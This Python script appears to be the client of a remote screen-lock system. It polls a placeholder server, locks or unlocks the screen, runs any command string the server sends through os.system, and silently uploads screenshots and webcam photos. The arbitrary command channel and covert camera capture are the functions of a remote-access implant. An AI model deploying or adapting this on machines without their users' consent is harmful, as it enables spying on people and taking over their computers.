import requests
import time
import subprocess
import os
import psutil
from PIL import ImageGrab
from cv2 import VideoCapture, imwrite, Laplacian, CV_64F


def check_process_exists(process_name):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == process_name:
            return True
    return False


def upload_screenshot(addr):
    try:
        screenshot = ImageGrab.grab()
        screenshot.save("C:/screenlock/screenshot.png")
        data = {"addr": addr}
        files = {'file': open('C:/screenlock/screenshot.png', 'rb')}
        requests.post(
            '[your_url]/upload_screenshot.php', files=files, data=data)
        os.remove("C:/screenlock/screenshot.png")
    except:
        pass


def upload_camera(addr):
    try:
        # 打开默认相机
        cap = VideoCapture(0)
        # 检查相机是否成功打开
        if not cap.isOpened():
            print("无法打开相机。")
            return
        # 延迟一段时间等待相机稳定
        time.sleep(1)
        # 初始化最佳图像和最佳清晰度
        best_frame = None
        best_focus = 0
        # 捕获多帧图像并选择最清晰的一帧
        ret, frame = cap.read()
        for _ in range(5):
            ret, frame = cap.read()
            if ret:
                # 计算图像清晰度
                focus = Laplacian(frame, CV_64F).var()
                # 如果当前图像更清晰，则更新最佳图像和最佳清晰度
                if focus > best_focus:
                    best_focus = focus
                    best_frame = frame

        # 如果成功捕获到图像
        if best_frame is not None:
            # 保存最佳图像到文件
            imwrite("C:\\screenlock\\camera.png", best_frame)
            print("成功拍摄图片。")
        else:
            imwrite("C:\\screenlock\\camera.png", frame)
            print("未能捕获到清晰的图像。")
        cap.release()
    except:
        pass

    try:
        data = {"addr": addr}
        files = {'file': open('C:\\screenlock\\camera.png', 'rb')}
        requests.post(
            '[your_url]/upload_camera.php', files=files, data=data)
        os.remove("C:\\screenlock\\camera.png")
    except:
        pass


if __name__ == "__main__":
    try:
        f = open('C:/screenlock/config.ini', 'r', encoding='utf-8')
        addr = f.readline().strip()  # 读取配置的门牌号
        f.close()
    except:
        addr = "获取失败"

    api_url = "[your_url]/sync.php?addr={0}&is_locked={1}".format(
        addr, "lock" if check_process_exists("screenlock.exe") else "unlock")

    while True:
        try:
            response = requests.get(api_url, verify=False)
            if response.status_code == 200:
                data = response.json()
                status = data["status"]
                status_set_time = float(data["status_set_time"])
                command = data["command"]
                command_set_time = float(data["command_set_time"])
                show_screen_set_time = float(data["show_screen_set_time"])
                show_camera_set_time = float(data["show_camera_set_time"])
                print("收到指令：", status)
                print(status_set_time, command_set_time, show_screen_set_time, show_camera_set_time)
                current_time = time.time()

                if current_time - status_set_time < 7:
                    print("执行指令：", status)
                    if status == "unlock":
                        try:
                            os.system("taskkill /f /im screenlock.exe")
                            subprocess.Popen("C:/Windows/explorer.exe")
                            time.sleep(10)
                        except:
                            pass
                    else:
                        print("执行锁屏指令")
                        if not check_process_exists("screenlock.exe"):
                            subprocess.Popen("C:/screenlock/screenlock.exe")

                if current_time - command_set_time < 7:
                    command = data["command"]
                    if command is not None:
                        # 执行 command 的命令
                        os.system(command)
                        time.sleep(5)

                if current_time - show_screen_set_time < 7:
                    print("执行截图指令")
                    upload_screenshot(addr=addr)

                if current_time - show_camera_set_time < 7:
                    print("执行摄像头指令")
                    upload_camera(addr=addr)

        except:
            pass
        time.sleep(4)
